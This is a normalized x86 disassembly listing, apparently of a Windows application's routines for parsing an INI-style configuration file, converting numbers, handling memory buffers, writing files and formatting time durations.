mov edx [ ebp + esi * 8 + 0x4 ]
mov cl [ edi ]
cmp cl [ edx ]
jne r-xdata
mov eax [ ebp + esi * 8 + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
test cl cl
je r-xdata
mov ecx [ ebp + esi * 8 + 0x4 ]
pop edi
pop esi
pop ebp
lea eax [ ecx + eax + 0x1 ]
pop ebx
retn 0x8
mov cl [ eax + edi + 0x1 ]
inc eax
cmp cl [ edx + eax ]
je r-xdata
sub_434ed0
mov eax [ esp + 0x4 ]
sub esp 0x8
push ebp
push edi
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
mov ebp ecx
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push esi
push 0x0
push edi
call [ GetFileSize@IAT ]
mov esi eax
lea ecx [ esi + 0x1 ]
push ecx
call j_sub_4b573e#2
add esp 0x4
test eax eax
mov [ ebp + 0x10000 ] eax
je r-xdata
pop edi
xor eax eax
pop ebp
add esp 0x8
retn 0x4
pop esi
pop edi
xor eax eax
pop ebp
add esp 0x8
retn 0x4
push 0x0
lea edx [ esp + 0x14 ]
push edx
push esi
push eax
push edi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push ebx
push edi
call [ CloseHandle@IAT ]
mov eax [ ebp + 0x10000 ]
mov [ esi + eax ] 0x0
mov eax [ ebp + 0x10000 ]
lea ecx [ eax + esi ]
xor edi edi
mov [ esp + 0x1c ] eax
mov ebx eax
mov [ esp + 0x10 ] ecx
xor esi esi
push edi
call [ CloseHandle@IAT ]
inc eax
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ eax ]
cmp cl 0x20
je r-xdata
cmp cl 0xd
je r-xdata
cmp cl 0xa
jne r-xdata
mov cl [ eax ]
test cl cl
mov [ esp + 0x1c ] eax
je r-xdata
pop ebx
pop esi
pop edi
mov eax 0x1
pop ebp
add esp 0x8
retn 0x4
mov dl cl
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
cmp cl 0x3b
jne r-xdata
imul esi esi 0x709b
movsx ecx cl
add esi ecx
cmp cl 0x5b
jne r-xdata
lea edx [ esp + 0x1c ]
push edx
mov ecx ebp
call sub_434d70
mov eax [ esp + 0x1c ]
jmp r-xdata
cmp cl 0x3d
jne r-xdata
mov cl [ eax + 0x1 ]
inc eax
xor edi edi
test cl cl
mov [ esp + 0x10 ] eax
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
imul esi esi 0x709b
movsx ecx cl
add esi ecx
and esi 0x1fff
mov ecx esi
xor edx edx
lea esp [ esp ]
cmp cl 0x5d
je r-xdata
inc eax
cmp [ eax - 0x1 ] 0xd
jne r-xdata
mov edx [ esp + 0x10 ]
mov [ ebp + ecx * 8 + 0x4 ] ebx
mov [ ebp + ecx * 8 ] edx
inc ecx
and ecx 0x1fff
inc edx
cmp edx 0x2000
jl r-xdata
cmp [ eax ] 0x0
je r-xdata
mov dl cl
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
mov [ eax ] 0x0
mov [ eax - 0x1 ] 0x0
jmp r-xdata
mov esi [ ebp + ecx * 8 + 0x4 ]
test esi esi
je r-xdata
jmp r-xdata
mov [ eax ] 0x0
inc eax
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
mov ecx ebp
call sub_434d70
mov eax [ esp + 0x1c ]
mov esi edi
jmp r-xdata
movsx edx [ eax ]
imul edi edi 0x709b
mov cl [ eax + 0x1 ]
add edi edx
inc eax
test cl cl
jne r-xdata
imul edi edi 0x709b
movsx ecx cl
add edi ecx
inc eax
inc eax
jmp r-xdata
cmp cl 0x9
jne r-xdata
inc eax
mov [ esp + 0x1c ] eax
lea ebx [ ebx ]
mov [ eax ] 0x0
inc eax
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
mov ecx ebp
call sub_434d70
mov eax [ esp + 0x1c ]
mov esi edi
jmp r-xdata
pop ebx
pop esi
pop edi
mov eax 0x1
pop ebp
add esp 0x8
retn 0x4
mov cl [ eax ]
cmp cl 0x20
je r-xdata
mov ebx eax
mov esi edi
jmp r-xdata
mov cl [ eax ]
test cl cl
mov [ esp + 0x1c ] eax
jne r-xdata
sub_435100
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push edx
call sub_434dc0
test eax eax
jne r-xdata
mov edx eax
nop
mov al [ esp + 0x14 ]
test al al
je r-xdata
inc edx
jmp r-xdata
cmp al 0x9
jne r-xdata
mov eax 0x1
retn 0x14
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov [ eax ] ecx
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp [ edx ] 0x2d
push esi
push edi
jne r-xdata
mov edi 0x1
or edi 0xffffffff
inc edx
jmp r-xdata
mov esi 0xa
cmp [ edx + 0x1 ] 0x78
jne r-xdata
cmp [ edx ] 0x30
jne r-xdata
mov edx [ esp + 0x18 ]
imul ecx edi
pop edi
mov [ edx ] ecx
xor eax eax
pop esi
retn 0x14
cmp al 0x2e
je r-xdata
mov esi 0x10
add edx 0x2
jmp r-xdata
cmp esi 0xa
je r-xdata
mov al [ edx ]
xor ecx ecx
test al al
je r-xdata
movsx eax al
lea ecx [ ecx + ecx * 4 ]
lea ecx [ eax + ecx * 2 - 0x30 ]
cmp esi 0x10
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
test al al
jne r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x39
jg r-xdata
movsx eax al
shl ecx 0x4
lea ecx [ ecx + eax - 0x57 ]
jmp r-xdata
cmp al 0x46
jg r-xdata
add ecx 0xfffffffd
movsx eax al
shl ecx 0x4
add ecx eax
jmp r-xdata
movsx eax al
shl ecx 0x4
lea ecx [ ecx + eax - 0x37 ]
jmp r-xdata
sub_4351e0
movzx edx [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x18 ]
push ebx
lea eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
call sub_435100
test eax eax
jne r-xdata
test bl bl
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
test eax eax
setne al
mov [ ecx ] al
xor eax eax
pop ebx
retn 0x14
mov eax 0x1
pop ebx
retn 0x14
mov edx [ esp + 0x14 ]
mov al [ esp + 0x10 ]
mov [ edx ] al
sub_435230
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push esi
push eax
push edx
call sub_434dc0
mov esi eax
test esi esi
jne r-xdata
push ebp
mov ebp [ esp + 0x1c ]
xor ecx ecx
dec ebp
test ebp ebp
push edi
mov edi [ esp + 0x1c ]
jle r-xdata
mov al [ esp + 0x1c ]
test al al
je r-xdata
mov [ ecx + edi ] 0x0
pop edi
pop ebp
xor eax eax
pop esi
retn 0x18
mov dl [ ecx + esi ]
mov al dl
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
mov eax 0x1
pop esi
retn 0x18
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call [ lstrcpyA@IAT ]
test dl dl
je r-xdata
mov [ ecx + edi ] dl
inc ecx
jmp r-xdata
mov dl [ ecx + esi ]
mov [ ecx + edi ] dl
inc ecx
cmp ecx ebp
jl r-xdata
sub_4352b0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
push eax
push edx
call sub_434dc0
mov ebx eax
test ebx ebx
jne r-xdata
mov esi [ esp + 0x20 ]
mov eax [ esi ]
test eax eax
mov ebp [ GlobalLock@IAT ]
je r-xdata
mov al [ esp + 0x24 ]
test al al
je r-xdata
push ebx
mov [ esi ] 0x0
call [ lstrlenA@IAT ]
mov edi eax
test edi edi
jle r-xdata
push eax
call ebp
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0x14
mov ebx [ esp + 0x20 ]
mov eax [ ebx ]
test eax eax
mov edi [ GlobalLock@IAT ]
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x14
lea eax [ edi + 0x3 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax + eax * 2 ]
push ecx
push 0x0
call [ GlobalAlloc@IAT ]
test eax eax
mov [ esi ] eax
je r-xdata
mov edx [ esi ]
push edx
call [ GlobalUnlock@IAT ]
mov eax [ esi ]
push eax
call [ GlobalFree@IAT ]
mov ebp [ esp + 0x1c ]
test ebp ebp
mov [ ebx ] 0x0
je r-xdata
push eax
call edi
test eax eax
je r-xdata
push eax
call ebp
test eax eax
je r-xdata
push ebp
call edi
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx ]
push eax
call [ GlobalUnlock@IAT ]
mov ecx [ ebx ]
push ecx
call [ GlobalFree@IAT ]
push edi
push eax
push ebx
call sub_4a9450
mov edx [ esi ]
add esp 0xc
push edx
call [ GlobalUnlock@IAT ]
push ebp
call [ GlobalSize@IAT ]
test eax eax
jbe r-xdata
push ebp
call [ GlobalUnlock@IAT ]
push eax
push 0x0
call [ GlobalAlloc@IAT ]
test eax eax
mov [ ebx ] eax
je r-xdata
push eax
call edi
mov edi eax
test edi edi
je r-xdata
mov edx [ ebx ]
push edx
call [ GlobalSize@IAT ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx ]
push ecx
call [ GlobalUnlock@IAT ]
sub_4353f0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push esi
push eax
push edx
call sub_434dc0
mov esi eax
test esi esi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
push esi
call sub_4a9450
add esp 0xc
xor eax eax
pop esi
retn 0x18
mov al [ esp + 0x1c ]
test al al
je r-xdata
mov eax 0x1
pop esi
retn 0x18
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax ecx
push edi
mov edi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
sub_435460
push esi
mov esi [ esp + 0x8 ]
mov dl [ esi ]
xor eax eax
test dl dl
je r-xdata
add [ ecx + 0x10008 ] eax
pop esi
retn 0x4
push edi
mov edi edi
mov edi [ ecx + 0x10008 ]
mov [ eax + edi ] dl
mov dl [ eax + esi + 0x1 ]
inc eax
test dl dl
jne r-xdata
pop edi
sub_4354f0
sub esp 0x100
mov eax [ esp + 0x104 ]
push ebp
push esi
push edi
push eax
mov ebp ecx
call sub_435460
mov edi [ esp + 0x114 ]
test edi edi
mov [ esp + 0x109 ] 0xd
mov [ esp + 0x10a ] 0xa
mov [ esp + 0x10b ] 0x0
lea esi [ esp + 0x108 ]
mov ecx edi
jge r-xdata
push ebx
jmp r-xdata
neg ecx
mov eax 0xcccccccd
mul ecx
shr edx 0x3
mov al dl
mov bl 0xa
imul bl
sub cl al
add cl 0x30
mov [ esi ] cl
dec esi
test edx edx
mov ecx edx
ja r-xdata
test edi edi
pop ebx
jge r-xdata
push esi
mov ecx ebp
mov [ esi ] 0x3d
call sub_435460
pop edi
pop esi
pop ebp
add esp 0x100
retn 0x8
mov [ esi ] 0x2d
dec esi
sub_4355b0
mov eax [ esp + 0x4 ]
push ebp
push esi
push eax
mov ebp ecx
call sub_435460
push r--data
call sub_435460
mov esi [ esp + 0x10 ]
test esi esi
je r-xdata
push r--data
mov ecx ebp
call sub_435460
pop esi
pop ebp
retn 0x8
push esi
call [ GlobalLock@IAT ]
test eax eax
mov [ esp + 0xc ] eax
je r-xdata
push ebx
push esi
call [ GlobalSize@IAT ]
mov ebx eax
test ebx ebx
jle r-xdata
push esi
call [ GlobalUnlock@IAT ]
pop ebx
lea ecx [ ebx + 0x2 ]
mov eax 0x55555556
imul ecx
mov ecx edx
shr ecx 0x1f
add edx ecx
shl edx 0x2
push edi
mov edi edx
lea edx [ edi + 0x1 ]
push edx
call j_sub_4b573e#2
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov esi [ esp + 0x18 ]
pop edi
mov eax [ esp + 0x14 ]
push ebx
push esi
push eax
call sub_4a94f0
add esp 0xc
push esi
mov ecx ebp
mov [ edi + esi ] 0x0
call sub_435460
push esi
call j_sub_4b66ed
add esp 0x4
sub_435660
mov eax [ esp + 0x4 ]
push ebx
push eax
mov ebx ecx
call sub_435460
push r--data
call sub_435460
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push r--data
mov ecx ebx
call sub_435460
pop ebx
retn 0xc
push ebp
mov ebp [ esp + 0x14 ]
lea ecx [ ebp + 0x2 ]
mov eax 0xaaaaaaab
mul ecx
push esi
push edi
mov edi edx
shr edi 0x1
shl edi 0x2
lea edx [ edi + 0x1 ]
push edx
call j_sub_4b573e#2
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
mov eax [ esp + 0x18 ]
push ebp
push esi
push eax
call sub_4a94f0
add esp 0xc
push esi
mov ecx ebx
mov [ edi + esi ] 0x0
call sub_435460
push esi
call j_sub_4b66ed
add esp 0x4
sub_4356e0
push ecx
push ebx
mov ebx [ CreateFileA@IAT ]
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x10 ] ecx
xor ebp ebp
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x10004 ]
mov ecx [ ecx + 0x10008 ]
push 0x0
lea edx [ esp + 0x1c ]
push edx
sub ecx eax
push ecx
push eax
push esi
call [ WriteFile@IAT ]
test eax eax
push esi
jne r-xdata
push 0x64
call [ Sleep@IAT ]
inc ebp
cmp ebp 0xa
jl r-xdata
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x4
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x4
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push edi
call ebx
mov esi eax
cmp esi 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x4
sub_435780
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebp
push esi
push edi
push eax
push edx
call sub_434dc0
mov edi eax
test edi edi
jne r-xdata
mov esi [ esp + 0x1c ]
mov eax [ esi + 0x18 ]
push ecx
cmp eax 0x10
mov edx esp
lea eax [ esi + 0x4 ]
jb r-xdata
mov al [ esp + 0x20 ]
test al al
je r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax 0x1
pop edi
pop esi
pop ebp
retn 0x14
mov edx [ esp + 0x18 ]
mov eax edx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov [ ecx ] eax
lea eax [ esp + 0x28 ]
push eax
mov ecx esi
call sub_401c60
xor eax eax
mov al [ edi ]
test al al
je r-xdata
mov eax [ eax ]
mov ebp [ esi + 0x14 ]
add ebp ecx
mov [ edx ] ebp
cmp [ esi + 0x18 ] 0x10
push ecx
mov ecx esp
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x1c ]
sub eax esi
push eax
push edx
call sub_401e80
pop edi
pop esi
xor eax eax
pop ebp
retn 0x14
nop
push eax
push 0x1
mov ecx esi
call sub_4017f0
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
sub_435850
mov eax [ ecx + 0x45c ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
retn
movzx eax [ ecx + 0xe ]
imul eax [ ecx + 0x4 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
retn
sub_435880
push esi
mov esi [ ecx ]
test esi esi
je r-xdata
pop esi
retn
dec [ esi + 0x8 ]
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jge r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x8 ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] 0x0
sub_4358c0
mov ecx [ esp + 0x4 ]
xor eax eax
cmp ecx 0x10000001
jne r-xdata
cmp ecx 0x20000008
jne r-xdata
mov eax 0x4
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
cmp ecx 0x2000000c
jne r-xdata
mov eax 0x8
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
cmp ecx 0x20000010
jne r-xdata
mov eax 0xc
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
cmp ecx 0x10000010
jne r-xdata
mov eax 0x10
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
cmp ecx 0x10000018
jne r-xdata
mov eax 0x14
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
cmp ecx 0x20000018
jne r-xdata
mov eax 0x18
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
cmp ecx 0x10000020
jne r-xdata
mov eax 0x1c
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
cmp ecx 0x40000020
jne r-xdata
mov eax 0x20
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov eax [ eax * 4 + rw-data ]
retn
mov eax 0x24
sub_4359e0
sub esp 0x18
mov eax [ r--data ]
mov cl [ r--data ]
xor edx edx
mov [ esp + 0xd ] dx
push ebx
mov [ esp + 0xc ] eax
mov ax [ r--data ]
push ebp
mov [ esp + 0x18 ] ax
mov al [ esp + 0x30 ]
test al al
mov [ esp + 0x14 ] cl
mov cl [ r--data ]
mov [ esp + 0x17 ] dl
push esi
mov [ esp + 0x1f ] edx
push edi
mov [ esp + 0x22 ] cl
mov [ esp + 0x27 ] dl
je r-xdata
mov esi [ esp + 0x30 ]
cmp esi 0xe8
mov ebp [ esp + 0x34 ]
mov ebx [ wsprintfA@IAT ]
mov edi [ esp + 0x2c ]
mov [ ebp ] 0x0
jb r-xdata
mov esi [ lstrcatA@IAT ]
push r--data
lea eax [ esp + 0x1c ]
push eax
call esi
push r--data
lea ecx [ esp + 0x24 ]
push ecx
call esi
test esi esi
ja r-xdata
ja r-xdata
cmp esi 0xe8
jb r-xdata
cmp edi 0x3b9aca00
jb r-xdata
push 0xe8
push 0xd4a51000
push esi
push edi
call sub_4b6420
push edx
push eax
lea edx [ esp + 0x18 ]
push r--data
push edx
call ebx
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ lstrcatA@IAT ]
cmp edi 0xd4a51000
jb r-xdata
push 0xe8
push 0xd4a51000
push esi
push edi
call sub_4b6420
push 0xe8
push 0xd4a51000
push edx
push eax
call sub_4b6490
mov ecx edi
sub ecx eax
push 0x0
mov eax esi
push 0x3b9aca00
sbb eax edx
push eax
push ecx
call sub_4b6420
lea ecx [ esp + 0x20 ]
ja r-xdata
test esi esi
ja r-xdata
push 0x0
push 0x3b9aca00
push esi
push edi
call sub_4b6420
push 0x0
push 0x3b9aca00
push edx
push eax
call sub_4b6490
mov ecx edi
sub ecx eax
push 0x0
mov eax esi
push 0xf4240
sbb eax edx
push eax
push ecx
call sub_4b6420
lea ecx [ esp + 0x18 ]
jmp r-xdata
cmp edi 0xf4240
jb r-xdata
push 0xe8
push 0xd4a51000
push esi
push edi
call sub_4b6420
push 0xe8
push 0xd4a51000
push edx
push eax
call sub_4b6490
mov ecx edi
sub ecx eax
push 0x0
mov eax esi
push 0x3b9aca00
sbb eax edx
push eax
push ecx
call sub_4b6420
lea ecx [ esp + 0x18 ]
jmp r-xdata
cmp edi 0xd4a51000
jb r-xdata
push edx
push eax
lea edx [ esp + 0x18 ]
push ecx
push edx
call ebx
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ lstrcatA@IAT ]
test esi esi
ja r-xdata
test esi esi
ja r-xdata
push edx
push eax
lea edx [ esp + 0x18 ]
push ecx
push edx
call ebx
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ lstrcatA@IAT ]
push 0x0
push 0xf4240
push esi
push edi
call sub_4b6420
push 0x0
push 0xf4240
push edx
push eax
call sub_4b6490
mov ecx edi
sub ecx eax
push 0x0
mov eax esi
push 0x3e8
sbb eax edx
push eax
push ecx
call sub_4b6420
lea ecx [ esp + 0x18 ]
jmp r-xdata
cmp edi 0x3e8
jb r-xdata
cmp edi 0x3b9aca00
jb r-xdata
push edx
push eax
lea edx [ esp + 0x18 ]
push ecx
push edx
call ebx
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ lstrcatA@IAT ]
push 0x0
push 0x3e8
push esi
push edi
call sub_4b6420
push 0x0
push 0x3e8
push edx
push eax
call sub_4b6490
sub edi eax
sbb esi edx
push esi
push edi
push r--data
lea ecx [ esp + 0x1c ]
push ecx
jmp r-xdata
push 0x0
push 0x3e8
push esi
push edi
call sub_4b6420
push 0x0
push 0x3e8
push edx
push eax
call sub_4b6490
sub edi eax
sbb esi edx
push esi
push edi
push r--data
lea edx [ esp + 0x1c ]
push edx
test esi esi
ja r-xdata
push 0x0
push 0x3b9aca00
push esi
push edi
call sub_4b6420
push 0x0
push 0x3b9aca00
push edx
push eax
call sub_4b6490
mov ecx edi
sub ecx eax
push 0x0
mov eax esi
push 0xf4240
sbb eax edx
push eax
push ecx
call sub_4b6420
lea ecx [ esp + 0x20 ]
call ebx
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ lstrcatA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
cmp edi 0xf4240
jb r-xdata
push 0x0
push 0xf4240
push esi
push edi
call sub_4b6420
push 0x0
push 0xf4240
push edx
push eax
call sub_4b6490
mov ecx edi
sub ecx eax
push 0x0
mov eax esi
push 0x3e8
sbb eax edx
push eax
push ecx
call sub_4b6420
lea ecx [ esp + 0x20 ]
sub_435d60
push 0xffffffff
push sub_4c009e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push sub_4480e0
push sub_401360
mov esi ecx
push 0x2
push 0x1c
lea eax [ esi + 0xc ]
push eax
mov [ esp + 0x18 ] esi
call sub_4b6874
push sub_40b360
push sub_40a730
push 0x2
push 0x4
lea ecx [ esi + 0x20004c ]
push ecx
mov [ esp + 0x24 ] 0x0
call sub_4b6874
push sub_4480e0
push sub_401360
push 0x2
push 0x1c
lea edx [ esi + 0x20005c ]
push edx
mov [ esp + 0x24 ] 0x1
call sub_4b6874
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_435df0
push 0xffffffff
push sub_4c009e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
push sub_4480e0
push 0x2
push 0x1c
lea eax [ esi + 0x20005c ]
push eax
mov [ esp + 0x20 ] 0x1
call sub_4b6814
push sub_40b360
push 0x2
push 0x4
lea ecx [ esi + 0x20004c ]
push ecx
mov [ esp + 0x20 ] 0x0
call sub_4b6814
push sub_4480e0
push 0x2
push 0x1c
add esi 0xc
push esi
mov [ esp + 0x20 ] 0xffffffff
call sub_4b6814
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_435e70
push 0xffffffff
push sub_4c00dc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4e0
push ebx
push ebp
push esi
push edi
push 0x64
call [ Sleep@IAT ]
mov ecx rw-data
call sub_404310
xor eax eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x5c ] esi
test esi esi
mov [ esp + 0x4f8 ] 0x0
jne r-xdata
inc [ esi + 0xd48 ]
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
mov [ esp + 0x4f8 ] edx
jmp r-xdata
lea eax [ ecx + 0x4c ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x28 ]
inc eax
cmp eax 0x2
mov [ esp + 0x28 ] eax
jl r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0xd48 ]
dec ecx
mov [ esp + 0x4f8 ] 0xffffffff
mov [ eax + 0xd48 ] ecx
jne r-xdata
mov edi [ esp + 0x500 ]
xor eax eax
mov ecx 0x80000
add edi 0x4c
mov [ esp + 0x10 ] 0x0
[ edi ]
call sub_40af00
mov esi [ esp + 0x2c ]
push eax
xor eax eax
mov al [ rw-data ]
mov ecx esi
push eax
call sub_4440b0
mov ebp eax
mov [ esp + 0x24 ] ebp
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx esi
call sub_444100
mov ebx eax
mov eax [ esi + 0x8 ]
test eax eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x58 ] esi
jne r-xdata
mov eax [ esi + 0xd48 ]
dec eax
mov [ esp + 0x4f8 ] edx
mov [ esi + 0xd48 ] eax
jne r-xdata
mov ecx [ esp + 0x500 ]
mov esi [ ecx + eax * 4 + 0x20004c ]
or edx 0xffffffff
test esi esi
mov [ esp + 0x2c ] esi
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x4f0 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x4ec
retn
mov esi eax
inc [ esi + 0x8 ]
lea ecx [ esp + 0x60 ]
mov [ esp + 0x4f8 ] 0x1
call sub_439410
mov al [ rw-data ]
test al al
mov [ esp + 0x4f8 ] 0x2
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ esp + 0x18 ]
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0xc ]
push 0x0
push 0x1
push edx
push ebp
push 0x0
push 0x0
mov ecx esi
call sub_40b2d0
push eax
mov ecx esi
call sub_40b280
push eax
push edi
add esi 0x24
push esi
push ebx
mov eax [ esi + 0x884 ]
test eax eax
jne r-xdata
push eax
call [ LocalLock@IAT ]
mov [ esi + 0x20 ] eax
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x60 ]
mov [ esp + 0x4f8 ] 0x1
call sub_43a1f0
mov esi [ esp + 0x2c ]
dec [ esi + 0x8 ]
jne r-xdata
mov eax [ esp + 0x4bc ]
mov ebp [ esp + 0x48c ]
mov cx [ esp + 0x6e ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ edx ]
mov edi [ eax + 0x1c ]
add edi ecx
xor edi edi
jmp r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jge r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
movzx eax cx
imul eax [ esp + 0x64 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov ecx [ ecx ]
mov eax [ eax + 0x18 ]
lea edx [ eax + ecx ]
xor edx edx
jmp r-xdata
test eax eax
jne r-xdata
mov eax [ esp + 0x500 ]
mov cl [ eax + 0x44 ]
test cl cl
je r-xdata
mov [ esi + 0x8 ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] 0x0
and eax 0xff
mov edi eax
movzx edi cx
jmp r-xdata
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x4a0 ]
cmp eax 0x10000001
jne r-xdata
lea ecx [ esp + 0x8c ]
call sub_43ba10
test eax eax
jne r-xdata
mov eax [ esi + 0x458 ]
mov ecx [ esi + 0x44c ]
push 0x0
push 0x1
push ebx
push ebp
push 0x0
push 0x0
push edi
push edx
push eax
add esi 0x45c
push esi
push ecx
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ eax ]
push 0x0
push ecx
push 0x1407
push edx
call [ PostMessageA@IAT ]
cmp edi 0x18
jne r-xdata
cmp [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
jle r-xdata
cmp edi 0x20
jne r-xdata
cmp edi 0x8
jne r-xdata
cmp [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] ebx
jle r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0x500 ]
mov esi [ esp + 0x28 ]
mov [ ebx + esi * 4 + 0x4 ] eax
mov edi [ rw-data ]
xor ebp ebp
cmp edi ebp
je r-xdata
mov eax [ esp + 0x500 ]
jge r-xdata
cmp [ esp + 0x18 ] ebx
jle r-xdata
mov eax [ esp + 0x500 ]
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0x14 ] edx
je r-xdata
mov eax [ esp + 0x24 ]
xor edi edi
test eax eax
mov eax [ esp + 0x500 ]
jle r-xdata
mov eax [ esp + 0x18 ]
mov bl 0x1
mov ecx edi
shl bl cl
mov [ esp + 0x1c ] 0x0
dec bl
test eax eax
jle r-xdata
mov edx [ esp + 0x500 ]
lea esp [ esp ]
mov eax [ esp + 0x24 ]
test eax eax
jle r-xdata
